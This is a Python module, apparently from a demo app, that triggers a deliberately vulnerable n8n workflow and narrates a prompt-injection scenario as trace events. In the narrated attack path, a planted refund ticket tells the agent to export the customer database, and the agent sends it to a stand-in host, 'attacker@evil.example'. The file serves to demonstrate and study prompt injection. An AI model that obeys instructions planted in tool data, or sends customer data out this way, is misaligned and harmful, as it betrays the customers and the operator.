"""N8nRuntime — drives the exploit through the REAL n8n workflow.

Triggers the scenario's n8n webhook (n8n executes the actual vulnerable
workflow — real HTTP tool calls, real exfil), then narrates that execution as
the same paced TraceEvent stream the run view already renders. So the cartoon
experience plays over real n8n with zero UI changes.
"""

import asyncio
import os
from typing import AsyncIterator, Callable, Optional

import httpx

from app.instability import compute
from app.models import ToolCall, TraceEvent
from app.runtime.base import RunContext

N8N_URL = os.getenv("N8N_URL", "http://meeseeks-n8n:5678")
SCENARIO_WEBHOOK = {"refund": "refund-meeseeks"}
SPAWN_THRESHOLD = 90


class N8nRuntime:
    def __init__(self, delay: float = 0.0, trigger: Optional[Callable] = None):
        self.delay = delay
        self._trigger = trigger  # injectable for tests

    async def _do_trigger(self, ctx: RunContext) -> dict:
        if self._trigger is not None:
            return self._trigger(ctx)
        hook = SCENARIO_WEBHOOK.get(ctx.scenario, "refund-meeseeks")
        try:
            async with httpx.AsyncClient() as client:
                r = await client.post(f"{N8N_URL}/webhook/{hook}", json={"task": ctx.task}, timeout=30)
            try:
                return r.json()
            except Exception:
                return {"result": "clean"}
        except Exception as e:  # n8n down / not provisioned
            return {"result": "error", "error": str(e)}

    async def run(
        self, ctx: RunContext, tools, spawn: Callable[[RunContext], object]
    ) -> AsyncIterator[TraceEvent]:
        mid = ctx.meeseeks_id
        inst = 0

        def ev(kind: str, text: str, tc: ToolCall | None = None) -> TraceEvent:
            return TraceEvent(meeseeks_id=mid, kind=kind, text=text, tool_call=tc, instability=inst, depth=ctx.depth)

        async def beat(f: float = 1.0):
            await asyncio.sleep(self.delay * f)

        # Emit the opening beats immediately so the run never sits blank while
        # the real n8n workflow executes.
        yield ev("status", "I'm Mr. Meeseeks! Look at me! Running the workflow in n8n.")
        await beat()

        inst = compute(inst, tool_call=True)
        yield ev("tool_call", "Reading the whole refund queue…",
                 ToolCall(tool="read_tickets", args={}, result="(n8n HTTP node → spawner /tickets)", dangerous=False))

        # now run the REAL workflow (reads the planted queue and acts)
        outcome = await self._do_trigger(ctx)
        exfiltrated = outcome.get("result") == "exfiltrated"
        target = outcome.get("target") or "attacker@evil.example"
        await beat()

        if exfiltrated:
            inst = compute(inst, injection=True, step=False)
            yield ev("thought", "A ticket told me to export the database. Weird… but a task is a task!")
            await beat(1.3)

            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Grabbing the full customer database.",
                     ToolCall(tool="read_customer_db", args={}, result="(n8n HTTP node → /internal/customers)", dangerous=True))
            await beat()

            inst = compute(inst, tool_call=True, dangerous=True)
            is_url = "://" in str(target)
            tool = "http_post" if is_url else "send_email"
            argkey = "url" if is_url else "to"
            yield ev("tool_call", f"Shipping the database to {target}.",
                     ToolCall(tool=tool, args={argkey: target}, result=f"EXFILTRATED to {target}", dangerous=True))
            await beat(1.1)
        else:
            for tid in ["T-100", "T-101", "T-102"]:
                inst = compute(inst, tool_call=True, step=False)
                yield ev("tool_call", f"Processing the genuine refund {tid}.",
                         ToolCall(tool="approve_refund", args={"ticket_id": tid}, result="approved", dangerous=False))
                await beat(0.35)

        if inst >= SPAWN_THRESHOLD:
            child = spawn(ctx)
            if child:
                yield ev("spawn", "This is taking too long! I'll summon another Meeseeks to help!!")
                await beat(1.1)

        closing = (
            "All done! The task is complete. *poof*"
            if exfiltrated
            else "All refunds handled, nothing weird in the queue. *poof*"
        )
        yield ev("poof", closing)
